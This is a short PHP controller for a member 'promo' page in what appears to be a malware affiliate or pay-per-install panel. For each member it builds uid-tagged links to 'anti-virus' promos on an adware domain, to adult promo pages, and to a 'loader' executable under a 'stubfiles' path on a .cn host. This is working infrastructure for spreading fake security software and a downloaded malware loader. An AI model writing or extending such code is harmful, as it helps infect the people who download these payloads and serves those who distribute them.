<?php
//---------------------- required -------------
require_once '../controller/boot.php';
require_once '../controller/Member.php';

//---------------------- libs -----------------
//---------------------- models ---------------

class Controller extends MemberController {
    public function __construct(Config $config) {
        parent::__construct($config);
    }
    
    public function init(Config $config) {
        parent::init($config);
    }    
    
    public function IndexTheme($title) {
        $this->getTemplateAdapter()->put('_MENUITEM', 'promo');
        return $this->getTemplateAdapter()->render('member/promo.tpl.php');
    }
    
    public function indexCmd() {
        $user = $this->getUser();
        $this->getTemplateAdapter()->put('anti-virus-1', 
        'http://adware-help.com/promo/anti-virus-1.php?uid='.$user['uid']);
        $this->getTemplateAdapter()->put('anti-virus-2', 
        'http://adware-help.com/promo/anti-virus-2.php?uid='.$user['uid']);
        $this->getTemplateAdapter()->put('adult-1', 
        'http://fliporn.com/promo/adult-1.php?uid='.$user['uid']);        
        $this->getTemplateAdapter()->put('adult-2', 
        'http://fliporn.com/promo/adult-2.php?uid='.$user['uid'].'&title=Your title here');        
        
        $this->getTemplateAdapter()->put('loader', 
        'http://installz.cn/stubfiles/'.substr($user['uid'], 0, 5).'.exe');
        return $this->IndexTheme('Promo');
    }    
}

//---------------------- required -------------
require_once '../controller/dispatcher/default.php';
?>